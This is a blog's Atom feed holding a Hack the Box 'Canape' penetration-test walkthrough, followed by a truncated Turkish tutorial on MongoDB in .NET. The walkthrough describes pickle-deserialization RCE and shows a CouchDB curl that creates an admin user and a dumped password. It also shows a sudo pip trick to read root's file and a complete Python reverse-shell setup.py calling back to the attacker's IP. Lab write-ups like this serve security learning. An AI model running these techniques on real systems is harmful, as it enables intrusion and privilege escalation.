@@ -1,0 +1,518 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://fasetto.github.io/atom.xml" rel="self" type="application/atom+xml" /><link href="http://fasetto.github.io/" rel="alternate" type="text/html" /><updated>2018-09-20T15:11:49+03:00</updated><id>http://fasetto.github.io/</id><title type="html">fasetto’s blog</title><subtitle>Full Stack Developer, UI &amp; UX Designer</subtitle><author><name>fasetto</name></author><entry><title type="html">{Hack the Box} \\ Canape Write-Up</title><link href="http://fasetto.github.io/hack-the-box-canape/" rel="alternate" type="text/html" title="{Hack the Box} \\ Canape Write-Up" /><published>2018-09-15T00:00:00+03:00</published><updated>2018-09-15T00:00:00+03:00</updated><id>http://fasetto.github.io/hack-the-box-canape</id><content type="html" xml:base="http://fasetto.github.io/hack-the-box-canape/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-canape.png&quot; alt=&quot;repository-pattern.png&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h1 id=&quot;hi-everyone&quot;&gt;Hi everyone,&lt;/h1&gt;
+
+&lt;p&gt;In this article I will be doing &lt;strong&gt;Canape&lt;/strong&gt; machine on &lt;a href=&quot;https://hackthebox.eu&quot;&gt;Hack the Box&lt;/a&gt;. &lt;br /&gt;
+Lets start..
+&lt;!-- more--&gt;&lt;/p&gt;
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;First we need to know which ports are open. So lets start with &lt;strong&gt;port-knocking&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@89e502fff05a:~/pentest/hack-the-box/machines/canape# nmap -sS -sC -sV 10.10.10.70 -o scan-01.txt
+Nmap scan report for 10.10.10.70
+Host is up (0.076s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-git:
+|   10.10.10.70:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Last commit message: final # Please enter the commit message for your changes. Li...
+|     Remotes:
+|_      http://git.canape.htb/simpsons.git
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Simpsons Fan Site
+|_http-trane-info: Problem with XML parsing of /evox/about
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see there is a git repo, probably contains source code of the app.
+I wanna look at that web page first.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/images/htb-canape-web-ui.png&quot; alt=&quot;canape-web-ui&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hmm, &lt;strong&gt;CouchDB&lt;/strong&gt; looks like interesting. At this point I examined all pages on this site. &lt;br /&gt;
+And decided to enumerate the directories on this site, so I ran &lt;strong&gt;gobuster&lt;/strong&gt;, but didn’t find anything. Because if I go to the page which there isn’t on the site, the app gives me &lt;em&gt;200 ok&lt;/em&gt; and shows me a weird random code. Must has a custom error handler.&lt;/p&gt;
+
+&lt;p&gt;So I decided to take a look at that git repo I found earlier.
+Edited my &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file to access the repo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pm2uaEznuvqG01Ths8xVfA.png&quot; alt=&quot;etc-hosts-file&quot; /&gt;&lt;/p&gt;
+&lt;center&gt;&lt;i&gt;(By the way, &lt;b&gt;ozzy&lt;/b&gt; is my docker container)&lt;/i&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@89e502fff05a:~/pentest/hack-the-box/machines/canape# git clone http://git.canape.htb/simpsons.git
+Cloning into 'simpsons'...
+remote: Counting objects: 49, done.
+remote: Compressing objects: 100% (47/47), done.
+remote: Total 49 (delta 18), reused 0 (delta 0)
+Unpacking objects: 100% (49/49), done.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/1_ffrnrj5K6rrKBJ1zRWPuyw.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There it is, &lt;strong&gt;__init__.py&lt;/strong&gt;&lt;br /&gt;
+Other files are not important. Just some html and js files.&lt;br /&gt;
+Now we can examine the source code of the app. I’m using &lt;strong&gt;Visual Studio Code&lt;/strong&gt; as my text editor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/1_TwPKjstuhGUrDey4xM4m-A.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;CouchDB&lt;/strong&gt; running on http://localhost:5984/ noted. Also there is a &lt;em&gt;custom error handler&lt;/em&gt; I talked about it. &lt;br /&gt;
+But the important one is &lt;strong&gt;cPickle&lt;/strong&gt;. Its a &lt;em&gt;built-in python module&lt;/em&gt; that allows you to &lt;strong&gt;serialize &amp;amp; deserialize&lt;/strong&gt; objects.&lt;/p&gt;
+
+&lt;p&gt;Here is the full gist of &lt;strong&gt;__init__.py&lt;/strong&gt;&lt;br /&gt;
+https://git.io/fAiTB&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/96797814faa9789a4787d3365a53a9da.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;Inside of the check function &lt;code class=&quot;highlighter-rouge&quot;&gt;item = cPickle.loads(data)&lt;/code&gt; &lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;This line will help us to get &lt;strong&gt;RCE (Remote Code Execution)&lt;/strong&gt;.
+If we post something to http://canape.htb/submit with &lt;em&gt;character&lt;/em&gt; and &lt;em&gt;quote&lt;/em&gt; parameters that function will create a file in &lt;strong&gt;/tmp&lt;/strong&gt; folder. And write our parameters in that file.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;outfile = write(char + quote)&lt;/code&gt;&lt;br /&gt;
+And than if we post to http://canape.htb/check with parameter &lt;strong&gt;id&lt;/strong&gt; that function will load our data.
+If our data contains malicious code, also will be executed.&lt;br /&gt;
+Now we can build our &lt;strong&gt;payload&lt;/strong&gt;. But first, character parameter must contain the one of items on the &lt;strong&gt;whitelist&lt;/strong&gt;, don’t forget that.
+Otherwise we will get &lt;em&gt;500 Internet Server Error.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;WHITELIST = [ &quot;homer&quot;, &quot;marge&quot;, &quot;bart&quot;, &quot;lisa&quot;, &quot;maggie&quot;, &quot;moe&quot;, &quot;carl&quot;, &quot;krusty&quot; ]&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/1_GRvSoUS_zlAZdR8BjeMOog.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I wrote a simple script to test it if it works..&lt;br /&gt;
+So I added &lt;strong&gt;“homer”&lt;/strong&gt; at the end of my payload. I added at the begining before but when I tried to execute my test script, it didn’t worked.&lt;/p&gt;
+
+&lt;p&gt;Ran it and boooom, the command was executed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/1_UwIXKF_esjrWqgn9l3pmdw.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Than I build a little script to get a &lt;strong&gt;reverse-shell.&lt;/strong&gt;&lt;br /&gt;
+Here is the gist link. https://git.io/fAiTU&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/1_mhbAJYSEztxNPp9GHNSGjA.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/1_VNIJlcUPp8ld2XxSoPfODw.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we are in as www-data user. We can start to enumerate from the inside.&lt;br /&gt;
+But first lets quickly upgrade our shell.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;CTRL + Z&lt;br /&gt;
+stty raw -echo&lt;br /&gt;
+fg&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;further-enumeration&quot;&gt;Further Enumeration&lt;/h1&gt;
+&lt;p&gt;First I want it to check &lt;strong&gt;couchdb&lt;/strong&gt;. I didn’t know how to query that database, so I searched on google.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@canape:/$ curl http://localhost:5984
+{&quot;couchdb&quot;:&quot;Welcome&quot;,&quot;version&quot;:&quot;2.0.0&quot;,&quot;vendor&quot;:{&quot;name&quot;:&quot;The Apache Software Foundation&quot;}}
+
+www-data@canape:/$ curl http://localhost:5984/_users/_all_docs
+{&quot;error&quot;:&quot;unauthorized&quot;,&quot;reason&quot;:&quot;You are not a server admin.&quot;}
+
+www-data@canape:/$ curl http://localhost:5984/_all_dbs
+[&quot;_global_changes&quot;,&quot;_metadata&quot;,&quot;_replicator&quot;,&quot;_users&quot;,&quot;passwords&quot;,&quot;simpsons&quot;]
+
+www-data@canape:/$ curl http://localhost:5984/passwords
+{&quot;error&quot;:&quot;unauthorized&quot;,&quot;reason&quot;:&quot;You are not authorized to access this db.&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Tip: You can &lt;strong&gt;prettify&lt;/strong&gt; that values in &lt;strong&gt;vscode&lt;/strong&gt; by pressing &lt;em&gt;CTRL + K F&lt;/em&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Hmmm thats interesting. There is passwords table, probably with usefull content.&lt;br /&gt;
+I wanna check it out, but it gives me an error that says I’m not authorized.&lt;/p&gt;
+
+&lt;p&gt;At this point, I know the version of &lt;strong&gt;couchdb&lt;/strong&gt;, so I searched for common exploits and vulnerabilities.
+And I came across with these:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;https://www.exploit-db.com/exploits/44498/&lt;br /&gt;
+https://serverfault.com/questions/742184/couchdb-user-creation-without-authentication-standard-behavior&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@canape:/$ curl -X PUT &quot;http://localhost:5984/_users/org.couchdb.user:pwn&quot; -d '{ &quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;pwn&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;roles&quot;: [], &quot;password&quot;: &quot;pwn&quot; }'
+&amp;lt;&quot;name&quot;: &quot;pwn&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;roles&quot;: [], &quot;password&quot;: &quot;pwn&quot; }'
+{&quot;ok&quot;:true,&quot;id&quot;:&quot;org.couchdb.user:pwn&quot;,&quot;rev&quot;:&quot;1-2189e39effa7061778a422d5e9318d21&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Yea, that worked, we added an admin user with name and password pwn .&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@canape:/$ curl http://pwn:pwn@localhost:5984/_users/_all_docs
+{&quot;total_rows&quot;:3,&quot;offset&quot;:0,&quot;rows&quot;:[
+{&quot;id&quot;:&quot;_design/_auth&quot;,&quot;key&quot;:&quot;_design/_auth&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-75efcce1f083316d622d389f3f9813f7&quot;}},
+{&quot;id&quot;:&quot;org.couchdb.user:guest&quot;,&quot;key&quot;:&quot;org.couchdb.user:guest&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-76778427e593a7e4a68832b308ed4a5e&quot;}},
+{&quot;id&quot;:&quot;org.couchdb.user:pwn&quot;,&quot;key&quot;:&quot;org.couchdb.user:pwn&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-2189e39effa7061778a422d5e9318d21&quot;}}
+]}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Lets have a look at &lt;strong&gt;passwords&lt;/strong&gt; database:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@canape:/$ curl http://pwn:pwn@localhost:5984/passwords/_all_docs
+{&quot;total_rows&quot;:4,&quot;offset&quot;:0,&quot;rows&quot;:[
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;2-81cf17b971d9229c54be92eeee723296&quot;}},
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;}},
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-77cd0af093b96943ecb42c2e5358fe61&quot;}},
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;}}
+]}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;At this point, I spent my time to understand that values. And I spent to much time to figure it out.&lt;br /&gt;
+Searched on google how to read those.&lt;/p&gt;
+
+&lt;p&gt;Than I understand, I didn’t know that base64 values are the actual &lt;strong&gt;id&lt;/strong&gt; values like sql table id’s.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Tip: http://docs.couchdb.org/en/stable/api/index.html&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@canape:/$ curl http://pwn:pwn@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
+{&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;_rev&quot;:&quot;2-81cf17b971d9229c54be92eeee723296&quot;,&quot;item&quot;:&quot;ssh&quot;,&quot;password&quot;:&quot;0B4jyA0xtytZi7esBNGp&quot;,&quot;user&quot;:&quot;&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We got a password.&lt;br /&gt;
+Lets cat the /etc/passwd for enumerating &lt;strong&gt;users&lt;/strong&gt; on system.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
+homer:x:1000:1000:homer,,,:/home/homer:/bin/bash
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Maybe that password we found belongs to &lt;strong&gt;homer ?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@canape:/$ su homer
+Password:
+homer@canape:/$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We got &lt;strong&gt;homer&lt;/strong&gt; now. &lt;strong&gt;user.txt&lt;/strong&gt; is in this home folder.&lt;/p&gt;
+
+&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;First lets check &lt;strong&gt;sudo -l&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;homer@canape:~$ sudo -l
+[sudo] password for homer:
+Matching Defaults entries for homer on canape:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User homer may run the following commands on canape:
+    (root) /usr/bin/pip install *
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We can install &lt;strong&gt;pip&lt;/strong&gt; packages as &lt;strong&gt;root,&lt;/strong&gt; great.&lt;br /&gt;
+I can grab the flag easily, let me show you.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;homer@canape:~/.root$ sudo pip install -r /root/root.txt
+The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
+The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
+Collecting xxxxxxxxxxxxxxxxxxxxxxx (from -r /root/root.txt (line 1))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Why it worked ? &lt;strong&gt;-r&lt;/strong&gt; flag means take all requipments from given txt file. And I gave it &lt;strong&gt;root.txt&lt;/strong&gt; :smiling_imp: &lt;br /&gt;
+Then pip want it to collect the first line and &lt;strong&gt;boooom.&lt;/strong&gt; &lt;em&gt;(first-line was the flag)&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;And this is other technique for &lt;strong&gt;reverse-shell.&lt;/strong&gt; Create empty folder and name it this little script as &lt;strong&gt;setup.py&lt;/strong&gt; and run &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo pip install .&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;10.10.14.163&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-i&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;homer@canape:~/.root$ sudo pip install .
+The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
+The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
+Processing /home/homer/.root
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Listening machine:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@89e502fff05a:~/pentest/hack-the-box/machines/canape# nc -lvnp 3141
+listening on [any] 3141 ...
+connect to [10.10.14.163] from (UNKNOWN) [10.10.10.70] 39504
+# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Done, now we are &lt;strong&gt;root&lt;/strong&gt;.
+It think it was an easy box, but getting the user is a bit hard. Because most of us didn’t knew about couchdb.&lt;br /&gt;
+I used pouchdb and couchdb together one of my projects but even I didn’t knew how to query it using http api ?!&lt;br /&gt;
+This box, pushes us to learn some.&lt;/p&gt;
+
+&lt;p&gt;See you guys later.&lt;/p&gt;</content><author><name>fasetto</name></author><category term="writeup" /><category term="pentest" /><category term="hackthebox" /><summary type="html">Hi everyone, In this article I will be doing Canape machine on Hack the Box. Lets start..</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://fasetto.github.io/assets/images/htb-canape.png" /></entry><entry><title type="html">.Net MongoDB Kullanımı</title><link href="http://fasetto.github.io/mongodb-in-dotnet/" rel="alternate" type="text/html" title=".Net MongoDB Kullanımı" /><published>2017-10-16T00:00:00+03:00</published><updated>2017-10-16T00:00:00+03:00</updated><id>http://fasetto.github.io/mongodb-in-dotnet</id><content type="html" xml:base="http://fasetto.github.io/mongodb-in-dotnet/">&lt;p&gt;&lt;img src=&quot;/assets/images/mongodb-logo.png&quot; alt=&quot;mongodb-logo&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;mongodb&quot;&gt;MongoDB&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;MongoDB&lt;/strong&gt;, &lt;em&gt;NoSQL&lt;/em&gt; kavramıyla ortaya çıkmış &lt;em&gt;document-oriented&lt;/em&gt; veri modelini kullanan açık kaynak bir veritabanıdır. &lt;br /&gt;
+&lt;!-- more--&gt;
+Bu yazımda .Net projelerinizde nasıl &lt;strong&gt;MongoDB&lt;/strong&gt; kullanabileceğinizi anlatacağım.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Bu Makalemde &lt;em&gt;MongoDB&lt;/em&gt; kurulumuna değinmeyeceğim, kurduğunuzu varsayarak anlatım yapacağım. &lt;br /&gt;
+Bu Makale bulunan kodların proje halini &lt;strong&gt;&lt;a href=&quot;https://github.com/fasetto/mongodb-sample&quot;&gt;buradan&lt;/a&gt;&lt;/strong&gt; indirebilirsiniz.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;mongodb-vs-sql&quot;&gt;MongoDB vs SQL&lt;/h2&gt;
+&lt;p&gt;Aşağıda bazı &lt;em&gt;SQL&lt;/em&gt; terimlerinin &lt;em&gt;MongoDB&lt;/em&gt; karşılıklarını görüyorsunuz. &lt;br /&gt;&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;SQL&lt;/th&gt;
+      &lt;th&gt;MongoDB&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;database&lt;/td&gt;
+      &lt;td&gt;database&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;table&lt;/td&gt;
+      &lt;td&gt;collection&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;column&lt;/td&gt;
+      &lt;td&gt;field&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;row&lt;/td&gt;
+      &lt;td&gt;document&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;mongodb-driver-kurulumu&quot;&gt;MongoDB Driver kurulumu&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;MongoDB&lt;/strong&gt; bir çok programlama dilini destekler ve bunlar için ayrı &lt;em&gt;driverları&lt;/em&gt; vardır. &lt;br /&gt;
+Bu driverlar uygulamamızın &lt;strong&gt;MongoDB&lt;/strong&gt; ile iletişim kurabilmesini sağlar. &lt;br /&gt;
+Bu yüzden .Net için olan driverı biz &lt;strong&gt;NuGet&lt;/strong&gt; aracılığı ile projemize dahil edeceğiz.&lt;/p&gt;
+
+&lt;p&gt;Package Manager Console ‘a aşağıdaki kodu yazıp kurabilirsiniz.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Install-Package MongoDB.Driver -Version 2.4.4&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ya da projenize sağ tıklayıp &lt;em&gt;Manage NuGet Packages&lt;/em&gt; seçeneğinden MongoDB.Driver yazıp arayarak çıkan pakedi kurabilirsiniz. &lt;br /&gt;
+Ben bu makaleyi yazarken kullandığım sürüm &lt;em&gt;2.4.4&lt;/em&gt; sürümü. Kodlar sürümlere göre farklılık gösterebilir.&lt;/p&gt;
+
+&lt;h2 id=&quot;repository-pattern-ile-örnek-uygulama&quot;&gt;Repository pattern ile örnek uygulama&lt;/h2&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/fd5897892277f23c08f69bc7680777ef.js&quot;&gt; &lt;/script&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/e39b2fe656a66f22a8f7fa2650f50ace.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;Burada &lt;em&gt;entity&lt;/em&gt; sınıfımızı projemize eklediğimiz driverdaki &lt;em&gt;attributeleri&lt;/em&gt; kullanarak oluşturuyoruz. &lt;br /&gt;
